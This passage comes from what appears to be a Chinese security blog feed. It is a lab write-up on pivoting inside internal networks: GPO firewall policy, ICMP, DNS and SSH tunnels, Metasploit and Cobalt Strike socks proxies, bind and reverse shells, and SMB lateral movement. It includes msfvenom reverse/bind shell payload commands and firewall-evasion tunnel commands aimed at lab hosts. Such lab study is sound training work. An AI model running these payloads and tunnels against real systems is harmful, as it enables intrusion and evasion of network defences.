Policy）来管理和同步其下属主机的防火墙规则。这样，管理员就可以集中地管理网络环境中所有计算机的防火墙设置，而不需要在每台计算机上单独进行配置。</p>\n<p>管理员可以在域控制器上创建和配置组策略对象（Group Policy Object，GPO），然后将这些 GPO 应用到一个或多个组织单位（Organizational Unit，OU）上。这些 OU 中的计算机将会自动接收并应用这些 GPO 中的设置，包括防火墙规则。</p>\n<p>在域控组策略新建 GPO</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316152809739.png\" alt=\"image-20240316152809739\"></p>\n<p>右键编辑打开策略里的防火墙设置</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153009887.png\" alt=\"image-20240316153009887\"></p>\n<p>在另一台域内主机防火墙是关闭的</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153127674.png\" alt=\"image-20240316153127674\"></p>\n<p>在域控这里设置防火墙属性把域防火墙设置为启动</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153220403.png\" alt=\"image-20240316153220403\"></p>\n<p>右键点击强制会立刻启用该策略，或者使用 gpupdate/force 更新策略，或者主机重启后生效</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316153403952.png\" alt=\"image-20240316153403952\"></p>\n<p>这时域控下属主机防火墙开启并且不可自己关闭必须由管理员设置</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155150999.png\" alt=\"image-20240316155150999\"></p>\n<p>当然设置的防火墙规则也会同步下发到下属主机例如禁止 80 端口入站</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316155851138.png\" alt=\"image-20240316155851138\"></p>\n<h3 id=\"icmp隧道\"><a class=\"markdownIt-Anchor\" href=\"#icmp隧道\">#</a> ICMP 隧道</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173544717.png\" alt=\"image-20240316173544717\"></p>\n<p>将 TCP 协议封装成 ICMP 协议</p>\n<p>常见工具 Pingtunnel,icmpsh,spp</p>\n<h4 id=\"pingtunnel\"><a class=\"markdownIt-Anchor\" href=\"#pingtunnel\">#</a> Pingtunnel</h4>\n<p><code>https://github.com/esrrhs/pingtunnel</code></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>kali:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/x64/meterpreter/reverse_tcp <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4343</span> <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">127.0</span>.0.1 <span class=\"token parameter variable\">-f</span> exe <span class=\"token parameter variable\">-o</span> msf.exe </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>use exploit/multi/handler</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">0.0</span>.0.0</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">9999</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>run</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>klai使用./pingtunnel <span class=\"token parameter variable\">-type</span> server 开启隧道</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>受害机:</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>pingtunnel.exe <span class=\"token parameter variable\">-type</span> client <span class=\"token parameter variable\">-l</span> :6666 <span class=\"token parameter variable\">-s</span> <span class=\"token number\">10.10</span>.10.130 <span class=\"token parameter variable\">-t</span> <span class=\"token number\">10.10</span>.10.130:8888 <span class=\"token parameter variable\">-tcp</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-noprint</span> <span class=\"token number\">1</span> <span class=\"token parameter variable\">-nolog</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>运行msf.exe</pre></td></tr></table></figure><p>首先生成木马受害机运行后会将流量转发到 127.0.0.1 的 4343 也就是受害机的 4343 端口但是因为木马是 tcp 流量被限制了出不了站这时候用 <code>Pingtunnel</code>  把 4343 端口的走 <code>tcp</code>  的流量封装成 <code>icmp</code>  协议的流量转到 kali 的 9999 端口，然后我们 kali 上面使用 <code>Pingtunnel</code>  开启隧道，并监听 9999 端口这样我们就可以正常接收到流量绕过防火墙限制了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325172437953.png\" alt=\"image-20240325172437953\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325164605444.png\" alt=\"image-20240325164605444\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240325170434411.png\" alt=\"image-20240325170434411\"></p>\n<p>CS 测试</p>\n<p>首先建立两个监听</p>\n<p>p1 为 10.10.10.130 端口 9898</p>\n<p>p2 为 127.0.0.1 端口 6666</p>\n<p>生成木马用 p2 生成，这样受害机器执行木马会将流量转发到本地的 6666 端口</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151229404.png\" alt=\"image-20240328151229404\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151611542.png\" alt=\"image-20240328151611542\"></p>\n<p>受害机:<br>\npingtunnel.exe -type client -l :6666 -s 192.168.0.145 -t 192.168.0.104:8888 -tcp 1 -noprint 1 -nolog 1</p>\n<p>将 6666 端口流量封装成 icmp 转发到 kali 的 9898 端口</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152102020.png\" alt=\"image-20240328152102020\"></p>\n<p>kali 启动隧道</p>\n<p>./pingtunnel -type server</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328152134631.png\" alt=\"image-20240328152134631\"></p>\n<p>cs 成功上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240328151958141.png\" alt=\"image-20240328151958141\"></p>\n<h3 id=\"dns隧道搭建\"><a class=\"markdownIt-Anchor\" href=\"#dns隧道搭建\">#</a> DNS 隧道搭建</h3>\n<p>准备一个域名</p>\n<p>要添加两条记录分别是 A 记录和 NS 记录</p>\n<p>A 记录指向我们的 vps 服务器</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1OU3MtcXQ5ZGo5bGhhNTI2YXIzM2FqeGFnNnMzc2F2M2VqODFpejY1Yy54eHgueHh4\">NS 记录指向刚才我们创建的 s.xxx.xxx</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1jc2RuczEtY3A3aTkzZDR3djhhMjU5NmFxb2M2NW4yNTRiN21tbm0xYi54eHgueHh4\">然后我们用 cs 上线时指向 dns1.xxx.xxx</span>，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1zLTd6NmFtaXk2aTIzcWN0cW52MGQueHh4Lnh4eA==\">他就会解析到 s.xxx.xxx</span>，接着 s.xxx.xxx 解析到我们的 vps 地址隧道搭建完成了就</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426164655935.png\" alt=\"image-20240426164655935\"></p>\n<p>**NS 记录，全称为 Name Server 记录，是用于指定域名应该由哪些 DNS 服务器进行解析的记录。** 它告诉互联网上的其他 DNS 服务器，当有查询请求到达时，应该将请求重定向到哪些 DNS 服务器上。</p>\n<p>接着 cs 创建 DNS 监听</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1kbnMxLTR6OGY0OTBhaGQueHh4LnhuLS14eHhzLTIyMWcueHh4Lnh4eA==\">地址写 dns1.xxx.xxx 和 s.xxx.xxx</span></p>\n<p>dns1 解析解析到 s. 接着再解析成 vps 地址</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426165506171.png\" alt=\"image-20240426165506171\"></p>\n<p>接着生成木马执行后内网主机即可上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170240575.png\" alt=\"image-20240426170240575\"></p>\n<p>接着执行 mode dns-txt</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426170944198.png\" alt=\"image-20240426170944198\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240426171142913.png\" alt=\"image-20240426171142913\"></p>\n<h3 id=\"ssh隧道搭建\"><a class=\"markdownIt-Anchor\" href=\"#ssh隧道搭建\">#</a> SSH 隧道搭建</h3>\n<p>SSH 隧道（SSH Tunneling）是一种利用 SSH 协议为其他协议或网络连接提供安全加密的方法。它通过在 SSH 连接中创建加密通道，可以安全地传输未加密的网络流量，并将其转发到目标目的地，确保数据传输的私密性和安全性。SSH 隧道通常用于加密和保护从本地计算机到远程服务器的通信。</p>\n<p>主要的 SSH 隧道类型包括：</p>\n<ol>\n<li>本地端口转发（Local Port Forwarding）：将本地计算机的指定端口的流量通过 SSH 连接转发到远程服务器，并由远程服务器将流量转发到目标服务器。这种方式使得本地计算机可以通过 SSH 连接安全地访问目标服务器提供的服务。</li>\n<li>远程端口转发（Remote Port Forwarding）：将远程服务器上的指定端口的流量通过 SSH 连接转发到本地计算机，并由本地计算机将流量转发到目标服务器。这种方式允许远程服务器上的服务通过 SSH 连接安全地访问本地计算机上的服务。</li>\n<li>动态端口转发（Dynamic Port Forwarding）：创建一个本地的 SOCKS 代理服务器，应用程序可以通过配置使用这个 SOCKS 代理，而 SSH 客户端则负责将流量通过 SSH 连接转发出去。这种方式可以用于将本地计算机的所有流量通过 SSH 连接转发到远程服务器，从而实现全局的网络流量加密和安全访问。</li>\n</ol>\n<p>网络环境为</p>\n<p>vps 不可和内网主机访问</p>\n<p>kali 与 web 可通信</p>\n<p>web 内网主机 80 端口</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>远程端口转发 可用于入站被封</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>在kali运行:</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-CfNg</span> <span class=\"token parameter variable\">-R</span> <span class=\"token number\">9999</span>:192.168.0.107:80 root@vpsIP</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这条命令表示将web主机的80端口流量通过本机转发给我们vps的9999端口上</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>-C：请求压缩所有数据</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>-f：后台执行ssh指令</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>-N：不执行远程指令</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>-g：允许远程主机连接主机的转发端口</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173707184.png\" alt=\"image-20240501173707184\"></p>\n<p>vps 即可访问 web 的网站</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501173102203.png\" alt=\"image-20240501173102203\"></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>本地端口转发 可用于出站被封</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-CfNg</span> <span class=\"token parameter variable\">-L</span> <span class=\"token number\">8888</span>:192.168.0.107:80 root@192.168.0.105</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>将web主机的80端口流量转到本机kali的8888端口上</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240501181131671.png\" alt=\"image-20240501181131671\"></p>\n<h3 id=\"代理实验\"><a class=\"markdownIt-Anchor\" href=\"#代理实验\">#</a> 代理实验</h3>\n<p>网络环境为</p>\n<p>win10 192.168.0.146 vm2<br>\nserver4 192.168.0.145 10.10.10.134 vm2 vm19<br>\nweb net 10.10.10.137 vm19  192.169.139.120 可出网<br>\n vps 公网</p>\n<p>拿到 web 主机后用他来当作跳板去渗透剩下两台主机，操作在 kali 通过 web 主机进行传输，因为 12server 是不出网的我们无法直接访问但是他是可以跟 web 主机通信的这样就可以在 web 主机上做代理把它当作跳板机和 12server 通信做渗透</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211546933.png\" alt=\"image-20240401211546933\"></p>\n<h4 id=\"msf代理测试\"><a class=\"markdownIt-Anchor\" href=\"#msf代理测试\">#</a> msf 代理测试</h4>\n<p>首先生成木马获取 web 主机</p>\n<p>msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=8888 LHOST=192.168.139.194 -f exe -o 555.exe</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240331172619806.png\" alt=\"image-20240331172619806\"></p>\n<p>接着 msf 添加路由</p>\n<p>run post/multi/manage/autoroute</p>\n<p>run autoroute -p</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401211151335.png\" alt=\"image-20240401211151335\"></p>\n<p>接着用到 <code>use auxiliary/server/socks_proxy</code>  socks 代理模块开启 socks 代理</p>\n<p>设置好配置运行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191609467.png\" alt=\"image-20240401191609467\"></p>\n<p>此时我们用本地的主机访问 12server10 网段的的网站是访问不到的，下载 sockscap64 软件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401191937614.png\" alt=\"image-20240401191937614\"></p>\n<p>配置好代理，地址是公网 kali 的 ip 和刚才 socks 代理模块开启的端口</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192153184.png\" alt=\"image-20240401192153184\"></p>\n<p>设置好可以通信后可以把代理添加到程序中</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193150388.png\" alt=\"image-20240401193150388\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401192344752.png\" alt=\"image-20240401192344752\"></p>\n<p>用代理打开浏览器后就可用访问内网 10.10.10.0 网段了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401193308682.png\" alt=\"image-20240401193308682\"></p>\n<p>在 kali 中只是 msf 可以跟 10 通信，要做到使用其他工具对 10 网段进行渗透可用用到 proxychains 代理</p>\n<p>对 proxychains.conf 更改写入刚才 msf 代理模块设置的端口 ip，或者 proxychains4.conf</p>\n<p>vim /etc/proxychains.conf</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210033816.png\" alt=\"image-20240401210033816\"></p>\n<p>设置好代理以后在要使用的工具前面加上 proxychains 命令例如 nmap 对 10.10.10.134 进行扫描，这样我们就可以在 kali 对 10 网段的内网渗透起来就会方便很多</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240401210313313.png\" alt=\"image-20240401210313313\"></p>\n<h4 id=\"cs代理测试\"><a class=\"markdownIt-Anchor\" href=\"#cs代理测试\">#</a> cs 代理测试</h4>\n<p>Proxifier 代理工具</p>\n<p>cs 生成木马获取 web 主机权限</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132210710.png\" alt=\"image-20240402132210710\"></p>\n<p>然后设置 socks 代理</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132259507.png\" alt=\"image-20240402132259507\"></p>\n<p>打开 Proxifier 代理工具配置文件代理服务器公网 kali 地址和刚才设置的端口 47385</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132417647.png\" alt=\"\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402132650862.png\" alt=\"image-20240402132650862\"></p>\n<p>开启代理之前无法访问 12server 内网中的网站</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133020619.png\" alt=\"image-20240402133020619\"></p>\n<p>设置好以后即可访问 10 网段</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133137882.png\" alt=\"image-20240402133137882\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402133218115.png\" alt=\"image-20240402133218115\"></p>\n<p>也可以添加规则，默认全部走 socks 代理</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402134404125.png\" alt=\"image-20240402134404125\"></p>\n<h4 id=\"cs正反shell上线内网主机\"><a class=\"markdownIt-Anchor\" href=\"#cs正反shell上线内网主机\">#</a> CS 正反 shell 上线内网主机</h4>\n<p>12server 是内网主机无法上网所以是找不到我们的公网 kali 主机无法上线，但是我们拿到了 web 主机，他是可以和 12server 通信的，可以制作一个正向木马让 12server 执行后流量转发到本机的 5555 端口再让 web 主机去主动连接 12server 的 5555 端口就可以实现上线了</p>\n<p>新建立一个监听并创建一个木马并放到 12server 执行</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402160446950.png\" alt=\"image-20240402160446950\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402160554427.png\" alt=\"image-20240402160554427\"></p>\n<p>在 web 主机的 shell 上输入 connect 10.10.10.134 5555 让他去连接 12server 的 5555，图中可看到是经过了 web 那台主机上线的</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240402161147077.png\" alt=\"image-20240402161147077\"></p>\n<p>现在获取了 12server 的权限在内网环境中还存在一个 win10 主机我们是无法通信的，可以在 12server 上做一个 socks 代理</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403152728968.png\" alt=\"image-20240403152728968\"></p>\n<p>此时内网 win10 主机的网站是无法访问的</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403152903425.png\" alt=\"image-20240403152903425\"></p>\n<p>挂上代理之后就可以访问到了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403153042000.png\" alt=\"image-20240403153042000\"></p>\n<h4 id=\"msf正反shell上线内网主机\"><a class=\"markdownIt-Anchor\" href=\"#msf正反shell上线内网主机\">#</a> MSF 正反 shell 上线内网主机</h4>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>生成正向shell</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>msfvenom <span class=\"token parameter variable\">-p</span> windows/x64/meterpreter/bind_tcp <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">6767</span> <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">0.0</span>.0.0 <span class=\"token parameter variable\">-f</span> exe <span class=\"token parameter variable\">-o</span> bind.exe</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>把这个木马放在12server执行</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>kali切换到windows/x64/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">6767</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhost <span class=\"token number\">10.10</span>.10.134 12server的地址</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>run</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161741174.png\" alt=\"image-20240403161741174\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161546975.png\" alt=\"image-20240403161546975\"></p>\n<p>搭建 socks 代理让可以访问到内网 win10</p>\n<p>进入 sessions 2</p>\n<p>添加 win 的 192.168.0.0 网段路由</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403161933298.png\" alt=\"image-20240403161933298\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403162051963.png\" alt=\"image-20240403162051963\"></p>\n<p>background 会话放置后台</p>\n<p>进入 socks 模块</p>\n<p>use auxiliary/server/socks_proxy</p>\n<p>set lport 6666</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163309671.png\" alt=\"image-20240403163309671\"></p>\n<p>vim proxvim /etc/proxychains.conf 设置好配置的端口就可以用 nmap 对 win10 进行扫描了</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163246928.png\" alt=\"image-20240403163246928\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240403163443593.png\" alt=\"image-20240403163443593\"></p>\n<h4 id=\"有防火墙限制的上线\"><a class=\"markdownIt-Anchor\" href=\"#有防火墙限制的上线\">#</a> 有防火墙限制的上线</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407153756849.png\" alt=\"image-20240407153756849\"></p>\n<p>前面步骤一样 win10 多了防火墙不能再用正向，可在 12server 做转发上线让 win10 主动找 12server 然后 12server 把 0.145 得到的会话转发到 10.134 网段就可以上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407154157041.png\" alt=\"image-20240407154157041\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407155607089.png\" alt=\"image-20240407155607089\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407155502201.png\" alt=\"image-20240407155502201\"></p>\n<p>接着在新建的 333 会话生成木马放在 win10 上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407160824882.png\" alt=\"image-20240407160824882\"></p>\n<p>图中可看到 win10 主动找的 12server 这样就不受 win10 防火墙限制</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240407160941500.png\" alt=\"image-20240407160941500\"></p>\n<h3 id=\"smb横向移动隧道搭建\"><a class=\"markdownIt-Anchor\" href=\"#smb横向移动隧道搭建\">#</a> SMB 横向移动隧道搭建</h3>\n<p>扫描 192.168.55.0/24 网段主机的 445 端口</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173049574.png\" alt=\"image-20240415173049574\"></p>\n<p>打开目标列表可看到有 192.168.55.200 也就是最后一台主机 win11</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173143210.png\" alt=\"image-20240415173143210\"></p>\n<p>新建一个 SMB 监听</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173244741.png\" alt=\"image-20240415173244741\"></p>\n<p>对 win11 进行横向</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415173729146.png\" alt=\"image-20240415173729146\"></p>\n<p>选择刚创建的监听器密码账号前期信息收集或通过渗透前几台主机获取的</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415184114001.png\" alt=\"image-20240415184114001\"></p>\n<p>成功通过 SMB 隧道上线</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240415184143950.png\" alt=\"image-20240415184143950\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2022/05/02/network-security/neiwang/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/",
            "url": "http://gyzero.shop/2022/05/02/network-security/neiwang/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/",
            "title": "内网穿透",
            "date_published": "2022-05-02T05:16:20.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/",
            "url": "http://gyzero.shop/2022/05/01/network-security/neiwang/CS%E4%B8%8A%E7%BA%BFlinux/",
            "title": "CS上线linux",
            "date_published": "2022-05-01T10:19:52.000Z",
